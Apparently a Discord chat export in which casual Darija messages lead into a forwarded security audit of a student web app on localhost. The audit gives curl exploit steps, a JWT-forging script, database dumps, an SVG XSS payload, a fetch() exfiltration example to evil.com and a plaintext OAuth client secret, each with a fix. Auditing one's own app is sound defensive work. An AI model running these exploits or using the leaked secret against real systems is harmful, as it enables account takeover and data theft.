Hi Ki
hiki7722
Visual Studio Code

Hi Ki

 — 7/30/24, 10:08 AM
https://www.otto.de/p/converse-chuck-taylor-all-star-hi-unisex-mono-sneaker-614119623/#variationId=614122575
OTTO
Converse CHUCK TAYLOR ALL STAR HI Unisex Mono Sneaker
Tolle Angebote und Top Qualität entdecken - CO2 neutraler Versand ✔ Kauf auf Rechnung und Raten ✔ Erfülle dir deine Wünsche bei OTTO!
Converse CHUCK TAYLOR ALL STAR HI Unisex Mono Sneaker
5il3ntR00t
 started a call that lasted 2 minutes. — 3/11/25, 11:33 AM
Hi Ki

 — 4/15/25, 4:03 PM
waaaa saaaahbi fin ghbrti
5il3ntR00t — 4/15/25, 8:32 PM
Wach akhoya hanya bikhir
Cv 3lik kolchi mzn
??
Hi Ki

 — 4/15/25, 8:32 PM
Wlah ila hmdolah nta howa hadak malin dar
5il3ntR00t — 4/15/25, 8:33 PM
hamdolilah akhay kolchi mzn
Hi Ki

 — 4/15/25, 8:33 PM
Wa 13 khwaya sahbi fach mchuti b9at blastk
5il3ntR00t — 4/15/25, 8:33 PM
ki Dayr nta cv ba3da kochi mzn ?
Hi Ki

 — 4/15/25, 8:33 PM
Wlah ila hamdolah akhoya
5il3ntR00t — 4/15/25, 8:33 PM
Wa Lahila I miss you brothers
lahafdaak akhay
Hi Ki

 — 4/15/25, 8:33 PM
Ba9i manchofok 3awtani
5il3ntR00t — 4/15/25, 8:36 PM
Hi Ki

 — 12/24/25, 6:36 PM
zzz
5il3ntR00t — 12/24/25, 6:37 PM
// ==UserScript==
// @name         Bus-Med Top Button
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Add a button at the top of bus-med.1337.ma
// @author       You

message (1).txt
14 KB
Hi Ki

 — 3/3/26, 10:58 PM
Forwarded
https://ft-trans.netlify.app/
ft_transcendence v19 Calculator
Calculate your project score, assign team members, and generate summaries for 42's ft_transcendence.
ft_transcendence v19 Calculator
Forwarded
Attachment file type: acrobat
screencapture-projects-intra-42-fr-scale-teams-9047225-edit-2026-01-28-20_02_55-1.pdf
6.82 MB
5il3ntR00t — 3/3/26, 11:37 PM
Forwarded
# 🔒 Security Audit Report — Peer Study Hub (F-transc)

**Auditor:** Automated Penetration Testing (HexStrike MCP + Manual Code Review)  
**Date:** March 3, 2026  
**Target:** https://localhost (Docker Compose deployment)  
**Scope:** Full-stack (Frontend, Backend, Database, Infrastructure)

SECURITY_AUDIT.md
36 KB
import jwt, time
payload = {
    'id': 999,
    'email': 'admin@attack.com',
    'role': 'ADMIN',
    'username': 'fakeadmin',

test.py
1 KB
# 🔒 Security Audit Report — Peer Study Hub (F-transc)

**Auditor:** Automated Penetration Testing (HexStrike MCP + Manual Code Review)  
**Date:** March 3, 2026  
**Target:** https://localhost (Docker Compose deployment)  
**Scope:** Full-stack (Frontend, Backend, Database, Infrastructure)

SECURITY_AUDIT.md
36 KB
﻿
5il3ntR00t
ma9la007
 
# 🔒 Security Audit Report — Peer Study Hub (F-transc)

**Auditor:** Automated Penetration Testing (HexStrike MCP + Manual Code Review)  
**Date:** March 3, 2026  
**Target:** https://localhost (Docker Compose deployment)  
**Scope:** Full-stack (Frontend, Backend, Database, Infrastructure)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Tools Used](#tools-used)
3. [Findings Summary Table](#findings-summary-table)
4. [CRITICAL Vulnerabilities](#critical-vulnerabilities)
5. [HIGH Vulnerabilities](#high-vulnerabilities)
6. [MEDIUM Vulnerabilities](#medium-vulnerabilities)
7. [LOW Vulnerabilities](#low-vulnerabilities)
8. [Remediation Guide](#remediation-guide)
9. [Scan Evidence & Artifacts](#scan-evidence--artifacts)

---

## Executive Summary

The **Peer Study Hub** application was subjected to a comprehensive security audit combining automated scanning (Nmap, Nikto, SQLMap, WAFw00f, browser agent) and manual code review of all backend and frontend source code.

### Risk Rating: **CRITICAL** 🔴

**27 vulnerabilities** were identified, including **5 CRITICAL**, **6 HIGH**, **11 MEDIUM**, and **5 LOW** severity issues. Multiple CRITICAL vulnerabilities were **actively exploited and confirmed**, including:

- **Complete unauthenticated access to all chat/messaging data**
- **JWT token forgery leading to full admin takeover**  
- **Direct database access with default credentials**
- **CORS misconfiguration allowing cross-origin credential theft**
- **Unauthenticated file upload enabling denial of service and stored XSS**

---

## Tools Used

| Tool | Purpose | Result |
|------|---------|--------|
| **Nmap** | Port scanning | Found ports 443 (HTTPS) and 5433 (PostgreSQL) open |
| **Nikto** | Web vulnerability scanner | Missing security headers, server version disclosure, exposed sensitive files |
| **SQLMap** | SQL injection testing | No SQL injection found (Prisma ORM protects) |
| **WAFw00f** | WAF detection | **No WAF detected** |
| **ffuf** | Directory fuzzing | API endpoint enumeration |
| **Browser Agent** | Live browser inspection | Login form analysis, security header audit, cookie analysis |
| **Manual curl** | API exploitation | Active exploitation of all CRITICAL/HIGH vulnerabilities |
| **psql** | Direct database access | Full database dump through exposed port |
| **PyJWT** | JWT token forgery | Admin privilege escalation confirmed |

---

## Findings Summary Table

| # | Severity | Vulnerability | CVSS | Status |
|---|----------|--------------|------|--------|
| 1 | 🔴 CRITICAL | Unauthenticated Chat API (All Endpoints) | 9.8 | **EXPLOITED** |
| 2 | 🔴 CRITICAL | Hardcoded JWT Secret → Token Forgery & Admin Takeover | 9.8 | **EXPLOITED** |
| 3 | 🔴 CRITICAL | PostgreSQL Exposed with Default Credentials | 9.1 | **EXPLOITED** |
| 4 | 🔴 CRITICAL | CORS Misconfiguration (`origin: true`) | 8.6 | **EXPLOITED** |
| 5 | 🔴 CRITICAL | OAuth Client Secret Committed in Source Code | 8.5 | **CONFIRMED** |
| 6 | 🟠 HIGH | Sender Spoofing in Chat Messages | 8.1 | **EXPLOITED** |
| 7 | 🟠 HIGH | Unauthenticated File Upload (50MB, SVG XSS) | 7.5 | **EXPLOITED** |
| 8 | 🟠 HIGH | Comment Update IDOR (No Ownership Check) | 7.3 | **CONFIRMED** |
| 9 | 🟠 HIGH | JWT Stored in localStorage (XSS → Token Theft) | 7.1 | **CONFIRMED** |
| 10 | 🟡 MEDIUM | User Enumeration via Login Error Messages | 5.3 | **EXPLOITED** |
| 11 | 🟡 MEDIUM | OAuth Token Passed in URL Query String | 5.3 | **CONFIRMED** |
| 12 | 🟡 MEDIUM | Missing Security Headers (6 headers) | 5.0 | **CONFIRMED** |
| 13 | 🟡 MEDIUM | Server Version Disclosure (nginx/1.28.2) | 5.0 | **CONFIRMED** |
| 14 | 🟡 MEDIUM | No Rate Limiting on Login (Brute-force) | 5.0 | **EXPLOITED** |
| 15 | 🟡 MEDIUM | Stale JWT Role (No DB Revalidation) | 4.8 | **CONFIRMED** |
| 16 | 🟡 MEDIUM | XSS Interceptor Only Sanitizes Body | 4.5 | **CONFIRMED** |
| 17 | 🟢 LOW | Username Bug in Registration (Wrong Variable) | 3.7 | **CONFIRMED** |
| 18 | 🟢 LOW | Self-Signed TLS Certificate | 3.5 | **CONFIRMED** |
| 19 | 🟢 LOW | Package.json and .gitignore Exposed | 3.0 | **CONFIRMED** |
| 20 | 🟠 HIGH | WebSocket join_room — No Membership Check | 7.5 | **CONFIRMED** |
| 21 | 🟠 HIGH | Chat Message Update/Delete IDOR | 7.3 | **CONFIRMED** |
| 22 | 🟡 MEDIUM | Duplicate Route Exposure via Nginx | 5.0 | **CONFIRMED** |
| 23 | 🟡 MEDIUM | GET /users/:id Information Disclosure | 4.5 | **CONFIRMED** |
| 24 | 🟡 MEDIUM | Mass Email Disclosure via /chat/users | 5.0 | **CONFIRMED** |
| 25 | 🟡 MEDIUM | No Security Headers on Uploaded Files | 4.0 | **CONFIRMED** |
| 26 | 🟢 LOW | Account Enumeration via Registration | 3.0 | **CONFIRMED** |
| 27 | 🟢 LOW | avatarUrl Accepts Arbitrary Input | 3.0 | **CONFIRMED** |

---

## CRITICAL Vulnerabilities

### VULN-1: Unauthenticated Chat API — All Endpoints Publicly Accessible

**File:** `backend/auth/src/chat/chat.controller.ts`  
**CVSS:** 9.8 (CRITICAL)  
**CWE:** CWE-306 (Missing Authentication for Critical Function)

#### Description
The entire `ChatController` in the auth service has **NO `@UseGuards(AuthGuard)`** decorator. Every chat endpoint is publicly accessible without any authentication, allowing anyone to:
- List all users with their email addresses
- Read any user's private conversations
- Read all messages in any conversation
- Send messages impersonating any user
- Create/delete conversations
- Upload files

#### Proof of Exploitation

**Step 1: Dump all users (no authentication)**
```bash
curl -ks https://localhost/api/chat/users
```
**Response:**
```json
[
  {"id": 1, "email": "pentester@test.com", "profile": {"username": "pentester"}},
  {"id": 2, "email": "pentester2@test.com", "profile": {"username": "pentester2"}},
  {"id": 3, "email": "pentest99@test.com", "profile": {"username": "pen99"}}
]
```

**Step 2: Create a conversation between any two users**
```bash
curl -ks -X POST https://localhost/api/chat/conversation/find-or-create \
  -H 'Content-Type: application/json' \
  -d '{"userId1": 1, "userId2": 3}'
```
**Response:** Conversation ID 5 created between users 1 and 3.

**Step 3: Send a message as user 1 (without being user 1)**
```bash
curl -ks -X POST https://localhost/api/chat/new-message \
  -H 'Content-Type: application/json' \
  -d '{"conversationId": 5, "senderId": 1, "content": "I am user 1 but this was sent by an attacker!", "type": "TEXT"}'
```
**Response:** Message sent successfully as user 1.

**Step 4: Read all messages in any conversation**
```bash
curl -ks https://localhost/api/chat/conversation/5/messages
```
**Response:** All private messages returned.

#### Fix
Add `@UseGuards(AuthGuard)` to the `ChatController` class in `backend/auth/src/chat/chat.controller.ts`:

```typescript
@UseGuards(AuthGuard)  // ADD THIS
@Controller('chat')
export class ChatController {
  // ...
}
```

Also remove `senderId` from the `SendMessageDto` and derive it from `req.user.id` in the controller.

---

### VULN-2: Hardcoded JWT Secret → Token Forgery & Full Admin Takeover

**Files:**
- `backend/auth/.env` → `JWT_SECRET="super_secret_key"`
- `docker-compose.yml` → `JWT_SECRET=super_secret_key`  
- `backend/chat/src/chat.gateway.ts` → fallback: `'super_secret_key'`

**CVSS:** 9.8 (CRITICAL)  
**CWE:** CWE-798 (Use of Hard-coded Credentials)

#### Description
The JWT signing secret is hardcoded as `"super_secret_key"` in multiple files. Anyone who reads the source code (or the docker-compose.yml) can forge arbitrary JWT tokens with any user ID and role, including `ADMIN`.

#### Proof of Exploitation

**Step 1: Forge an ADMIN JWT token**
```python
import jwt, time
payload = {
    'id': 999,
    'email': 'admin@attack.com',
    'role': 'ADMIN',
    'username': 'fakeadmin',
    'iat': int(time.time()),
    'exp': int(time.time()) + 3600
}
token = jwt.encode(payload, 'super_secret_key', algorithm='HS256')
print(token)
```

**Step 2: Access admin-only endpoint**
```bash
curl -ks https://localhost/api/users \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```
**Response:** Full user list returned (admin-only endpoint).

**Step 3: Escalate any user to ADMIN**
```bash
curl -ks -X PATCH https://localhost/api/users/2/role \
  -H "Authorization: Bearer <FORGED_TOKEN>" \
  -H 'Content-Type: application/json' \
  -d '{"role": "ADMIN"}'
```
**Response:**
```json
{"id": 2, "email": "pentester2@test.com", "role": "ADMIN"}
```
User 2 is now ADMIN. **Full admin takeover achieved.**

#### Fix
1. Generate a strong random secret: `openssl rand -base64 64`
2. Store it in a `.env` file that is **NOT committed to git** (add `.env` to `.gitignore`)
3. Remove `JWT_SECRET=super_secret_key` from `docker-compose.yml` — use `env_file` instead
4. Remove the hardcoded fallback in `chat.gateway.ts`

```typescript
// BEFORE (INSECURE)
private readonly JWT_SECRET = process.env.JWT_SECRET || 'super_secret_key';

// AFTER (SECURE)
private readonly JWT_SECRET = process.env.JWT_SECRET;
// If undefined, throw an error at startup
constructor() {
  if (!this.JWT_SECRET) throw new Error('JWT_SECRET environment variable is required');
}
```

---

### VULN-3: PostgreSQL Exposed with Default Credentials

**File:** `docker-compose.yml` (line 37: `ports: - "5433:5432"`)  
**CVSS:** 9.1 (CRITICAL)  
**CWE:** CWE-200 (Information Exposure), CWE-798 (Hardcoded Credentials)

#### Description
PostgreSQL port 5432 is mapped to the host on port 5433. The database uses default credentials `postgres:postgres`. Anyone on the network can directly access the database, bypassing all application-level security.

#### Proof of Exploitation

```bash
PGPASSWORD=postgres psql -h localhost -p 5433 -U postgres -d ft_transc \
  -c 'SELECT id, email, role, "passwordHash" FROM users;'
```
**Response:**
```
 id |        email        | role |                        passwordHash
----+---------------------+------+-------------------------------------------------------------
  1 | pentester@test.com  | USER | $2b$10$8IzHX7ZwRgDgvUo3ZWfz.e9BUyaBiuWOv...
  2 | pentester2@test.com | USER | $2b$10$Hh9KD00U/SyeQYwy02hHIecyePeDQXNY....
  3 | pentest99@test.com  | USER | $2b$10$BKhPJC8D8u3KLbJZmIJ7YeINFOj8yZnSd...
```

**All user data, password hashes, messages, and every row in every table is accessible.**

#### Fix
1. Remove the port mapping from `docker-compose.yml`:
```yaml
postgres:
    # REMOVE THIS:
    # ports:
    #   - "5433:5432"
    networks:
      - my-app-network
```
2. Change the default password to a strong random string
3. Only allow connections from the Docker internal network

---

### VULN-4: CORS Misconfiguration — Any Origin Accepted with Credentials

**Files:**
- `backend/auth/src/main.ts` → `origin: true`
- `backend/core/src/main.ts` → `origin: true`

**CVSS:** 8.6 (CRITICAL)  
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)

#### Description
The auth and core services set `origin: true` in their CORS configuration, which reflects **any requesting origin** in the `Access-Control-Allow-Origin` header. Combined with `credentials: true`, this means **any website** can make authenticated API requests on behalf of a logged-in user.

#### Proof of Exploitation

```bash
curl -ks -D- -o /dev/null https://localhost/api/auth/login \
  -X OPTIONS \
  -H 'Origin: https://evil-attacker.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: Content-Type,Authorization'
```
**Response headers:**
```
Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS
Access-Control-Allow-Headers: Content-Type,Authorization
```

**An attacker's website can read the victim's token from localStorage and make API calls.**

#### Attack Scenario
Since the API uses Bearer tokens (not cookies), the direct CORS impact requires chaining with XSS. However, if the app ever migrates to cookie-based auth (recommended in VULN-9 fix), this CORS config would allow immediate cross-origin attacks. Additionally, with the current `origin: true` setting:

1. Any XSS on any origin that shares a cookie jar could be amplified
2. It signals a lack of origin control, violating defense-in-depth
3. If a future change introduces cookie-based sessions, this becomes instantly exploitable:

```html
<!-- If cookies were used (after fixing VULN-9): -->
<script>
  // Victim visits evil.com while logged into Peer Hub
  fetch('https://localhost/api/profiles/me', { credentials: 'include' })
    .then(r => r.json())
    .then(data => fetch('https://evil.com/steal?data=' + JSON.stringify(data)));
</script>
```

#### Fix
```typescript
// BEFORE (INSECURE)
app.enableCors({ origin: true, credentials: true });

// AFTER (SECURE)
app.enableCors({
  origin: ['https://your-production-domain.com', 'https://localhost'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
});
```

---

### VULN-5: OAuth Client Secret in Source Code

**File:** `backend/auth/.env`  
**CVSS:** 8.5 (CRITICAL)  
**CWE:** CWE-798 (Hard-coded Credentials)

#### Description
The 42 School OAuth `CLIENT_SECRET` is stored in plaintext in the `.env` file which is included in the repository:
```
CLIENT_SECRET="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"
```

If this file is committed to Git, the OAuth credentials are compromised.

#### Fix
1. Add `.env` to `.gitignore` (DO NOT commit it)
2. Rotate the OAuth client credentials at https://profile.intra.42.fr/oauth/applications
3. Use environment variables injected at deploy time, not in files

---

## HIGH Vulnerabilities

### VULN-6: Sender Spoofing in Chat Messages

**File:** `backend/auth/src/chat/dto/send-message.dto.ts`  
**CVSS:** 8.1 (HIGH)  
**CWE:** CWE-284 (Improper Access Control)

#### Description
The `SendMessageDto` accepts `senderId` from the request body. Even if authentication is added (fixing VULN-1), the sender ID should be derived from the JWT token, not from user input. Any authenticated user can send messages as any other user.

#### Proof of Exploitation
See VULN-1, Step 3 — the `senderId` field is client-controlled.

#### Fix
Remove `senderId` from the DTO and derive it from the authenticated user:
```typescript
// In the controller:
@Post('new-message')
@UseGuards(AuthGuard)
async sendMessage(@Body() dto: SendMessageDto, @Req() req: any) {
  return this.chatService.sendMessage({
    ...dto,
    senderId: req.user.id  // Always use authenticated user's ID
  });
}
```

---

### VULN-7: Unauthenticated File Upload (50MB, SVG XSS Vector)

**File:** `backend/auth/src/chat/chat.controller.ts`  
**CVSS:** 7.5 (HIGH)  
**CWE:** CWE-434 (Unrestricted Upload), CWE-79 (XSS)

#### Description
The chat file upload endpoint:
1. Requires **no authentication**
2. Accepts file uploads up to **50MB**
3. Accepts `image/svg+xml` MIME type (SVGs can contain JavaScript)
4. Has **no magic byte validation** (only MIME type, easily spoofable)

#### Proof of Exploitation

**Step 1: Upload malicious SVG (no auth)**
```bash
cat > /tmp/xss_test.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS - Cookie: ' + document.cookie)</script>
</svg>
EOF

curl -ks -X POST https://localhost/api/chat/upload \
  -F "file=@/tmp/xss_test.svg;type=image/svg+xml"
```
**Response:**
```json
{
  "fileUrl": "/uploads/chat/images/98d5a88f-bf15-4850-bb47-dc5dd9fe1cdd.svg",
  "fileType": "IMAGE",
  "mimeType": "image/svg+xml"
}
```

**Step 2: Verify the SVG is served:**
```bash
curl -ks https://localhost/uploads/chat/images/98d5a88f-bf15-4850-bb47-dc5dd9fe1cdd.svg
```
The SVG with JavaScript is served. Currently nginx serves it as `text/plain` (mitigates direct XSS), but if `Content-Type` is fixed to `image/svg+xml`, the JavaScript would execute.

#### Fix
```typescript
// 1. Add AuthGuard to the upload endpoint
// 2. Block SVG uploads entirely, or serve them with sanitization
// 3. Add magic byte validation for all uploads
// 4. Add Content-Disposition: attachment header for all upload types
// 5. Add X-Content-Type-Options: nosniff header
ALLOWED_MIME_TYPES: string[] = [
  'image/jpeg', 'image/png', 'image/gif', 'image/webp',
  // REMOVE: 'image/svg+xml'
  'video/mp4', 'video/webm',
  'audio/mpeg', 'audio/wav', 'audio/ogg',
  'application/pdf',
];
```

---

### VULN-8: Comment Update IDOR — Any User Can Edit Any Comment

**File:** `backend/auth/src/comments/comments.service.ts`  
**CVSS:** 7.3 (HIGH)  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

#### Description
The `PUT /comments/update` endpoint updates a comment by `commentId` without verifying the requesting user owns the comment. Any authenticated user can edit any comment.

#### Proof of Exploitation
```bash
# User A creates a comment, User B updates it
curl -ks -X PUT https://localhost/api/comments/update \
  -H "Authorization: Bearer <USER_B_TOKEN>" \
  -H 'Content-Type: application/json' \
  -d '{"commentId": 1, "content": "Modified by another user", "postId": 1}'
```

#### Fix
```typescript
async update(commentId: number, userId: number, content: string) {
  const comment = await this.prisma.comment.findUnique({ where: { id: commentId } });
  if (!comment || comment.userId !== userId) {
    throw new ForbiddenException('You can only edit your own comments');
  }
  return this.prisma.comment.update({
    where: { id: commentId },
    data: { content: sanitizeInput(content) },
  });
}
```

---

### VULN-9: JWT Stored in localStorage — Vulnerable to XSS Token Theft

**Files:**
- `frontend/src/services/authApi.ts` → `localStorage.setItem('auth_token', ...)`
- `frontend/src/components/Auth/AuthCallback.tsx` → same

**CVSS:** 7.1 (HIGH)  
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

#### Description
The JWT access token is stored in `localStorage`, which is accessible to any JavaScript running on the page. If any XSS vulnerability exists (including via third-party scripts), the token can be stolen with `localStorage.getItem('auth_token')`.

#### Fix
Use **httpOnly cookies** instead of localStorage for token storage:
```typescript
// Backend: Set JWT as httpOnly cookie
res.cookie('access_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000, // 1 hour
});
```

---

## MEDIUM Vulnerabilities

### VULN-10: User Enumeration via Login Error Messages

**File:** `backend/auth/src/auth/auth.service.ts`  
**CWE:** CWE-203 (Observable Discrepancy)

#### Proof of Exploitation
```bash
# Existing email → "Wrong password"
curl -ks -X POST https://localhost/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"pentester@test.com","password":"wrong"}'
# Response: {"message":"Wrong password"}

# Non-existing email → "Invalid credentials"
curl -ks -X POST https://localhost/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"nonexist@test.com","password":"wrong"}'
# Response: {"message":"Invalid credentials"}
```

An attacker can enumerate valid email addresses.

#### Fix
Use the same error message for both cases:
```typescript
throw new UnauthorizedException('Invalid email or password');
```

---

### VULN-11: OAuth Token in URL Query String

**File:** `backend/auth/src/auth/auth.controller.ts` (line 38)

#### Description
After OAuth callback: `res.redirect(\`https://localhost/callback?token=${token}\`)`

The JWT is visible in:
- Browser URL bar and history
- Server/proxy access logs
- `Referer` headers sent to any linked resources

#### Fix
Use a short-lived authorization code pattern:
1. Redirect with a one-time `code` parameter
2. Frontend exchanges the code for a token via a POST request
3. Code expires after first use

---

### VULN-12: Missing Security Headers (6 Headers)

**Confirmed via Nikto and Browser Agent scanning:**

| Header | Status | Risk |
|--------|--------|------|
| `Content-Security-Policy` | ❌ Missing | XSS mitigation |
| `X-Frame-Options` | ❌ Missing | Clickjacking |
| `X-Content-Type-Options` | ❌ Missing | MIME sniffing |
| `Strict-Transport-Security` | ❌ Missing | HTTPS downgrade |
| `Referrer-Policy` | ❌ Missing | Information leakage |
| `Permissions-Policy` | ❌ Missing | Feature control |

#### Fix — Add to `nginx.conf`:
```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
```

---

### VULN-13: Server Version Disclosure

**Confirmed:** `Server: nginx/1.28.2` in response headers.

#### Fix
Add to `nginx.conf`:
```nginx
server_tokens off;
```

---

### VULN-14: Insufficient Rate Limiting on Authentication

**Confirmed:** 15 rapid login attempts all returned HTTP 401 (not throttled).

The global ThrottlerGuard allows 100 requests per minute, which is too generous for authentication endpoints. An attacker could attempt ~100 passwords per minute per account.

#### Fix
Add stricter throttling specifically for auth endpoints:
```typescript
@Throttle({ default: { ttl: 60000, limit: 5 } })  // 5 attempts per minute
@Post('login')
async login(@Body() loginDto: LoginDto) { ... }
```

---

### VULN-15: Stale JWT Role — No Database Revalidation

**File:** `backend/auth/src/guards/auth.guard.ts`

The role is embedded in the JWT at login time. If an admin demotes a user, their existing token still carries `ADMIN` role for up to 1 hour until it expires.

#### Fix
Add a database lookup in the AuthGuard to verify the user still exists and their current role:
```typescript
const user = await this.prismaService.user.findUnique({ where: { id: payload.id } });
if (!user) throw new UnauthorizedException('User no longer exists');
request.user = { ...payload, role: user.role };
```

---

### VULN-16: XSS Interceptor Only Sanitizes Request Body

**File:** `backend/auth/src/utils/xss.interceptor.ts`

Query parameters and URL parameters are **not sanitized**, only `request.body`.

#### Fix
Extend the interceptor to also sanitize `request.query` and `request.params`.

---

## LOW Vulnerabilities

### VULN-17: Username Bug in Registration (Wrong Variable)

**File:** `backend/auth/src/auth/auth.service.ts`

The `register()` method computes a `finalUsername` to handle duplicates but then uses the original `username` variable in the `profile.create()` call, causing potential unique constraint violations.

#### Fix
```typescript
// Use finalUsername instead of username
const profile = await this.prisma.profile.create({
  data: { userId: user.id, username: finalUsername, avatarUrl: null, bio: null }
});
```

---

### VULN-18: Self-Signed TLS Certificate

**Confirmed via nmap/openssl:** Self-signed certificate with Subject = Issuer.

No HSTS header means browsers could be downgraded to HTTP.

#### Fix
Use Let's Encrypt or a proper CA-signed certificate in production.

---

### VULN-19: Sensitive Files Exposed

**Confirmed via Nikto:**
- `/package.json` — Exposes dependencies and versions
- `/.gitignore` — Exposes project structure

#### Fix
Block these in nginx:
```nginx
location ~ /\.(git|env|gitignore) {
    deny all;
    return 404;
}
location = /package.json {
    deny all;
    return 404;
}
```

---

## Remediation Guide

### Priority 1 — Fix Immediately (CRITICAL)

| # | Action | File(s) to Change |
|---|--------|-------------------|
| 1 | Add `@UseGuards(AuthGuard)` to ChatController | `backend/auth/src/chat/chat.controller.ts` |
| 2 | Generate a strong JWT secret, remove hardcoded values | `.env`, `docker-compose.yml`, `chat.gateway.ts` |
| 3 | Remove PostgreSQL port mapping | `docker-compose.yml` |
| 4 | Whitelist CORS origins | `backend/auth/src/main.ts`, `backend/core/src/main.ts` |
| 5 | Rotate OAuth client credentials, add `.env` to `.gitignore` | `.env`, `.gitignore` |

### Priority 2 — Fix Soon (HIGH)

| # | Action | File(s) to Change |
|---|--------|-------------------|
| 6 | Remove `senderId` from SendMessageDto, derive from JWT | `send-message.dto.ts`, `chat.controller.ts` |
| 7 | Block SVG uploads, add magic byte validation, add auth to upload | `chat.controller.ts` |
| 8 | Add ownership check to comment update | `comments.service.ts` |
| 9 | Migrate JWT storage to httpOnly cookies | Frontend `authApi.ts`, Backend auth controller |

### Priority 3 — Fix Before Production (MEDIUM)

| # | Action | File(s) to Change |
|---|--------|-------------------|
| 10 | Unify login error messages | `auth.service.ts` |
| 11 | Use authorization code flow for OAuth, not URL token | `auth.controller.ts`, `AuthCallback.tsx` |
| 12 | Add security headers to nginx | `nginx.conf` |
| 13 | Disable server version disclosure | `nginx.conf` |
| 14 | Stricter rate limiting on auth endpoints | `auth.controller.ts` |
| 15 | Add DB revalidation for role in AuthGuard | `auth.guard.ts` |
| 16 | Extend XSS interceptor to query/params | `xss.interceptor.ts` |

---

## Additional Vulnerabilities (Found During Final Review)

### VULN-20: WebSocket `join_room` — No Conversation Membership Check

**File:** `backend/chat/src/chat.gateway.ts`  
**CVSS:** 7.5 (HIGH)  
**CWE:** CWE-862 (Missing Authorization)

#### Description
Any authenticated WebSocket user can join **any conversation room** by emitting `join_room` with an arbitrary `conversationId`. There is no check that verifies the user is actually a participant in that conversation. This allows **real-time eavesdropping on private conversations**, even after VULN-1 is fixed.

```typescript
// CURRENT (INSECURE)
@SubscribeMessage('join_room')
handleJoinRoom(@MessageBody() data: { conversationId: number }, @ConnectedSocket() client: Socket) {
    const roomName = `conversation_${data.conversationId}`;
    client.join(roomName);  // No membership check!
}
```

#### Fix
```typescript
@SubscribeMessage('join_room')
async handleJoinRoom(@MessageBody() data: { conversationId: number }, @ConnectedSocket() client: Socket) {
    const userId = this.connectedUsers.get(client.id)?.userId;
    // Verify user is a participant in this conversation
    const conversation = await this.chatService.getConversation(data.conversationId);
    if (!conversation || (conversation.user1Id !== userId && conversation.user2Id !== userId)) {
        client.emit('error', { message: 'Access denied' });
        return;
    }
    client.join(`conversation_${data.conversationId}`);
}
```

---

### VULN-21: Chat Message Update/Delete IDOR

**File:** `backend/auth/src/chat/chat.controller.ts`  
**CVSS:** 7.3 (HIGH)  
**CWE:** CWE-639 (IDOR)

#### Description
The `PUT /chat/message` and `POST /chat/message/delete` endpoints accept `userId` from the **request body** instead of deriving it from authentication. Even after adding AuthGuard (fixing VULN-1), any authenticated user can update or delete any other user's messages.

```typescript
// CURRENT (INSECURE)
@Put('message')
updateMessage(@Body() body: any) {
    const { userId, ...updateMessageDto } = body;  // userId from body!
    return this.chatService.updateMessage(userId, updateMessageDto);
}
```

#### Fix
```typescript
@Put('message')
@UseGuards(AuthGuard)
updateMessage(@Body() updateMessageDto: UpdateMessageDto, @Req() req: any) {
    return this.chatService.updateMessage(req.user.id, updateMessageDto);
}
```

---

### VULN-22: Duplicate Route Exposure via Nginx

**File:** `backend/nginx/nginx.conf`  
**CVSS:** 5.0 (MEDIUM)

#### Description
Nginx exposes all API routes at **both** `/api/*` (prefixed) and at the root level (`/auth/`, `/posts/`, `/comments/`, etc.). This doubles the attack surface and could bypass future path-based WAF rules or rate limiting.

For example, rate limiting on `/api/auth/login` could be circumvented via `/auth/login`.

#### Fix
Remove direct root-level route mappings and only allow access through the `/api/` prefix.

---

### VULN-23: `GET /users/:id` Information Disclosure (IDOR)

**File:** `backend/auth/src/users/users.controller.ts`  
**CVSS:** 4.5 (MEDIUM)  
**CWE:** CWE-200 (Information Exposure)

#### Description
The `findOne()` endpoint does not require `@Roles(Role.ADMIN)`. Any authenticated user can enumerate any other user's email, role, and creation date by iterating through IDs.

#### Proof of Exploitation
```bash
curl -ks https://localhost/api/users/1 -H "Authorization: Bearer <ANY_USER_TOKEN>"
```

#### Fix
Return only the requesting user's own data, or add role restrictions.

---

### VULN-24: Mass Email Disclosure via `/chat/users`

**File:** `backend/auth/src/chat/chat.controller.ts`  
**CVSS:** 5.0 (MEDIUM)

#### Description
Even after fixing VULN-1 by adding authentication, the `GET /chat/users` endpoint returns **all users with their email addresses**. This should only return minimal data needed for chat (id, username, avatar).

#### Fix
```typescript
return this.prisma.user.findMany({
  select: {
    id: true,
    profile: { select: { username: true, avatarUrl: true } }
    // Do NOT include email
  }
});
```

---

### VULN-25: No Security Headers on Uploaded File Serving

**File:** `backend/nginx/nginx.conf`  
**CVSS:** 4.0 (MEDIUM)

#### Description
The `/uploads/` location serves files without `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment`, or CSP headers. This amplifies VULN-7's SVG XSS risk.

#### Fix
Add to nginx `/uploads/` location:
```nginx
location /uploads/ {
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Disposition "attachment" always;
    add_header Content-Security-Policy "default-src 'none'" always;
}
```

---

### VULN-26: Account Enumeration via Registration

**File:** `backend/auth/src/auth/auth.service.ts`  
**CVSS:** 3.0 (LOW)

Registration returns `'Email already exists'` for duplicate emails. Combined with VULN-10 (login enumeration), this gives attackers two ways to enumerate valid accounts.

#### Fix
Return a generic message: `'Registration failed. If this email is already registered, please login.'`

---

